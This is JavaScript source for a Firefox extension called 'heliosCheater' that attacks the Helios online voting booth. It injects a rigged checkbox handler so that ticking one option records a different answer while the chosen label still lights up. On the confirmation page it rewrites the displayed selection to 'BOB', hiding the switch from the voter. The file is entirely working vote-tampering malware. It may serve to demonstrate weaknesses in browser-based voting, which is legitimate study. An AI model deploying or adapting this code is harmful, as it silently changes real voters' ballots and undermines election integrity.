// this script is when user clicks the checkbox and change the color of the label...wtf..
var scriptClick = "BOOTH.lala = function(question_num, answer_num, checked_p) {\
  if (checked_p) {\
      if ($(BOOTH.ballot.answers[question_num]).index(answer_num) == -1)\
        BOOTH.ballot.answers[question_num].push(answer_num);\
     $(\'#answer_label_\' + question_num + \"_\" + 1).addClass(\'selected\');\
  } else {\
     BOOTH.ballot.answers[question_num] = UTILS.array_remove_value(BOOTH.ballot.answers[question_num], answer_num);\
     $(\'#answer_label_\' + question_num + \"_\" + 1).removeClass(\'selected\');\
  }\
  if (BOOTH.election.questions[question_num].max != null && BOOTH.ballot.answers[question_num].length >= BOOTH.election.questions[question_num].max) {\
     $(\'.ballot_answer\').each(function(i, checkbox) {\
        if (!checkbox.checked)\
            checkbox.disabled = true;\
     });\
     $(\'#warning_box\').html(\"Maximum number of options selected.<br />To change your selection, please de-select a current selection first.\");\
  } else {\
     $(\'.ballot_answer\').each(function(i, checkbox) {\
       checkbox.disabled = false;\
     });\
     $(\'#warning_box\').html(\"\");\
  }\
};";

var heliosCheater = function () {
    var questionHacked = false;
    var confirmHacked = false;

    return {
	init : function () {
	    gBrowser.addEventListener("DOMContentLoaded", function () {		
		heliosCheater.run();		
	    }, false);
	},
	
	run : function () {
	    var url = content.document.location.href;
	    // voting page
	    if (url.toString().match("vote.heliosvoting.org/booth") != null) {
		var questionDiv = content.document.getElementById("question_div");
		var confirmDiv = content.document.getElementById("confirm_div");
		// answering question
		if (!questionHacked && questionDiv != null && questionDiv.getAttribute("style") != null
		    && questionDiv.getAttribute("style").match("block") != null) {
		    var cb = content.document.getElementById("answer_0_1");
		    if (cb != null) {
			var aa = content.document.getElementsByTagName("script")[12];
			var x = content.document.createElement("script");
			x.setAttribute("language", "javascript");
			x.innerHTML = scriptClick;
			aa.parentNode.appendChild(x);
//			aa.innerHTML = aa.innerHTML + "BOOTH.lala = function() {alert(\"123\");};";
//			aa = aa.innerHTML;
//			aa = aa.replace("$(\'#answer_label_\' + question_num + \"_\" + answer_num).addClass(\'selected\');", "alert(\'123\');");
//			cb.setAttribute("onclick", "BOOTH.click_checkbox(0, 0, this.checked);");
			cb.setAttribute("onclick", "BOOTH.lala(0, 0, this.checked);");
			//cb.setAttribute("onclick", myClick_checkbox(0, 0, this.checked));
			questionHacked = true;
		    }
		}

		// confirming
		if (!confirmHacked && confirmDiv != null && confirmDiv.getAttribute("style") != null
		    && confirmDiv.getAttribute("style").match("block") != null) {
		    var selection = confirmDiv.getElementsByTagName("b")[0].childNodes[0];
		    if (selection != null) {
			selection.data = "BOB";
			confirmHacked = true;
		    }
		}

		var t = setTimeout("heliosCheater.run()", 1000);
	    }
	}
    }; 
}();
window.addEventListener("load", heliosCheater.init, false);